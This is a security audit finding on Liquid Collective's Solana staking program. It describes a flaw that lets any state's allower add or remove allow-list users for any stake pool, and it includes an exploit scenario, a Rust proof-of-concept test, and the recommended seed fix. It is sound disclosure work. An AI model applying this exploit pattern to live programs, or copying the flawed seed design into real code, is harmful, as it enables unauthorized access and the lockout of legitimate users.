---
tags:
  - lang/rust
  - sector/staking-pool
  - platform/quantstamp
  - severity/high
protocol: "[[Liquid Collective   Solana]]"
auditors:
  - István Böhm
report: "https://certificate.quantstamp.com/full/liquid-collective-solana/cbb18ece-3a03-4897-a040-f197fc641e4d/index.html"
genome:
  - "[[access-roles]]"
  - "[[variant]]"
---
# Allow List Entries Can Be Added and Removed by Any State Allower

- id: 58723
- impact: HIGH
- protocol: Liquid Collective - Solana
- reporter: István Böhm (Quantstamp)
- source: https://certificate.quantstamp.com/full/liquid-collective-solana/cbb18ece-3a03-4897-a040-f197fc641e4d/index.html

## Summary


The client has marked a bug as "Fixed" and provided an explanation. The issue was related to the `AddToAllowlistEntry` and `RemoveFromAllowlistEntry` instructions not properly validating the `allower` signer value. This allowed a malicious user to whitelist themselves for any stake pool by creating a `State` account and using it as the `allower` when adding themselves to the allow list. The bug has been fixed by using the `State` account's public key as a seed for the `allow_list_entry` account.

## Details

**Update**
Marked as "Fixed" by the client. Addressed in: `1854b38bbdfdc51db030e31f4b60889e98fc627b`. The client provided the following explanation:

> Great find! We appreciate the suggested test and have added it to our test suite. We made the suggested change and added the `state` account address to the allowlist entry seed. However, we have also removed the `stake_pool` account from the allowlist entry seed, since the funding authority stored inside the `state` account should already ensure the 1:1 relationship between the `state` account and a given `stake_pool` account.

**File(s) affected:**`processors/add_to_allowlist_entry.rs`, `processors/remove_from_allowlist_entry.rs`, `instructions/add_to_allowlist_entry.rs`, `instructions/add_to_allowlist_entry.rs`

**Description:** The `AddToAllowlistEntry` and `RemoveFromAllowlistEntry` instructions have the following constraint for the `allower` signer value:

```
address = state.allower @ ErrorCode::OnlyAllower
```

However, the `allow_list_entry` account passed to both instructions only has the following constraint for its seeds:

```
seeds = [b"allow_list_entry", args.stake_pool.as_ref(), args.user_account.as_ref()]
```

This effectively means that a valid `state` has to be passed to the instruction and that the `allower` that signs the transaction has to be that state's allower. However, this also means that, as long as the allower passes a valid `stake_pool` account and a valid `user_account`, they can add/remove said user account to/from the allow list for the referenced stake pool. As a result, any account that has `allower` access to any state can add and remove users from any arbitrary stake pool they desire.

**Exploit Scenario:**

1.   The Liquid Collective team initializes a `State` account, creates an SPL Stake Pool, and whitelists users Alice and Bob. Alice and Bob can now interact with the stake pool without restriction.
2.   A malicious user initializes a `State` account with themself as the `allower`.
3.   The malicious user executes the `add_to_allowlist_entry()` function where the `stake_pool` is the SPL Stake Pool created by the Liquid Collective team and the `user_account` is the malicious user.
4.   Since the `add_to_allowlist_entry()` function does not validate that the `stake_pool` is associated with the `State` account the malicious user is the `allower` of, the malicious user is whitelisted for the SPL Stake Pool created by the Liquid Collective team.
5.   Similarly, the malicious user can execute the `remove_from_allowlist_entry()` function to remove Alice and Bob from the whitelist for the SPL Stake Pool created by the Liquid Collective team, preventing them from interacting with the stake pool further. 
Following is a test case developed as a proof-of-concept for the attack scenario above. The `test-utils/src/runner.rs::setup()` function was updated so the `self.stake_pools` vector has two different stake pools, one for each of the states created:

```
#[test_context(TestContext)]
#[tokio::test(flavor = "multi_thread")]
async fn qs_test_add_user_to_allowlist(ctx: &mut TestContext) {
    let state = Keypair::new();
    let state2 = Keypair::new();
    let runner = &mut ctx.runner;
    let mut participants = runner.test_account.iter();

    //1. Initialize two different states and create stake pools for them.
    runner.initialize(&state).await.unwrap();
    runner.initialize(&state2).await.unwrap();
    runner
        .create_stake_pool(state.pubkey(), 0, None, None, None, None)
        .await
        .unwrap();
    runner
        .create_stake_pool(state2.pubkey(), 1, None, None, None, None)
        .await
        .unwrap();

    //2. Get the default allower.
    let allower = runner.test_account.allower();

    //3. Set a new allower for the second state.
    let new_allower = Keypair::new();
    runner
        .set_allower(&runner.test_account.admin(), state2.pubkey(), new_allower.pubkey())
        .await
        .unwrap();

    let alice = participants.next().unwrap();

    //4. As the original allower (which is indeed the allower of the first state), add alice to the allowlist of the stake pool of the second state.
    let result = runner
        .add_to_allowlist_entry(&allower, state.pubkey(), 1, alice.pubkey())
        .await;
    assert!(result.is_ok());

    //5. Attempt to add alice to the stake pool of the second state as its new allower. This fails since alice is already allow-listed.
    let result2 = runner
        .add_to_allowlist_entry(&new_allower, state2.pubkey(), 1, alice.pubkey())
        .await;
    Error::assert_err(result2, ErrorCode::AllowlistEntryAlreadyExists);

    //6. Remaining checks to confirm the allow list entry was created under the second state's stake pool.
    let mut pt = runner.pt.write().await;
    let stake_pool = runner.state_pool(1);

    let (alice_allowlist_pda, bump) =
        find_allow_list_entry(&stake_pool.stake_pool.pubkey(), &alice.pubkey());

    let allowlist_entry = pt
        .get_account::<AllowListEntry>(alice_allowlist_pda, true)
        .await;

    // Assert that Alice has permission now
    assert_eq!(allowlist_entry.can_deposit_withdraw, true);
    assert_eq!(allowlist_entry.bump, bump);
}
```

**Recommendation:** Use the public key of the `State` account as a seed for the `allow_list_entry` account to tie them together. For example, in the `instructions/add_to_allowlist_entry.rs`, `instructions/deposit_sol.rs`, `instructions/deposit_stake.rs`, `instructions/remove_from_allowlist_entry.rs`, `instructions/withdraw_sol.rs`, and `instructions/withdraw_stake.rs` files, list the `seeds` for the `allow_list_entry` account as `[b"allow_list_entry", state.key().as_ref(), args.stake_pool.as_ref(), args.user_account.as_ref()]`.
